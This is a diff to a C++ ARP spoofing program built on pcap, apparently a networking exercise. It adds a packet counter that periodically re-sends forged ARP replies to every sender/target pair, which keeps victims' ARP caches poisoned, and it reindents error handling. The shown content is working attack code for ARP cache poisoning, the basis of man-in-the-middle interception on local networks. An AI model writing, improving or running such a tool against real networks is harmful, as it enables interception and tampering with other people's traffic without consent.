@@ -246,7 +246,7 @@ int main(int argc, char* argv[]) {
 		usage();
 		return EXIT_FAILURE;
 	}
-
+	uint32_t count=0;
 	char* dev = argv[1];
 	Mac my_mac;
 	if (!get_my_mac(dev, &my_mac)) {
@@ -315,14 +315,29 @@ int main(int argc, char* argv[]) {
 		int recv_res = pcap_next_ex(pcap, &header, &recv_packet_const);
 		recv_packet = const_cast<u_char*>(recv_packet_const);
 
-			if (recv_res == 0) continue;
-			if (recv_res == PCAP_ERROR || recv_res == PCAP_ERROR_BREAK) {
-				fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
-				pcap_close(pcap);
-				free_spoof_pair_list(pair_list);
-				return EXIT_FAILURE;
-			}
+		if (recv_res == 0) continue;
+		if (recv_res == PCAP_ERROR || recv_res == PCAP_ERROR_BREAK) {
+			fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
+			pcap_close(pcap);
+			free_spoof_pair_list(pair_list);
+			return EXIT_FAILURE;
+		}
+		if(count > 20){
+			for (SpoofPairNode* current = pair_list; current != NULL; current = current->next) {
+				if (current->sender_mac.isNull() || current->target_mac.isNull()) {
+					free_spoof_pair_list(pair_list);
+					return EXIT_FAILURE;
+				}
+				if (!spoof_sender_pair(dev, my_mac, my_ip, current)) {
+					free_spoof_pair_list(pair_list);
+					return EXIT_FAILURE;
+				}
+			}	
+			count =0;
+		}
+		count += 1;
 		if (header->caplen < sizeof(EthHdr)) continue;
+		
 
 		const EthHdr* recv_eth = reinterpret_cast<const EthHdr*>(recv_packet);
 		if (ntohs(recv_eth->type_) == EthHdr::Arp) {
@@ -381,6 +396,7 @@ int main(int argc, char* argv[]) {
 				continue;
 
 		}
+
 	}
 
 	
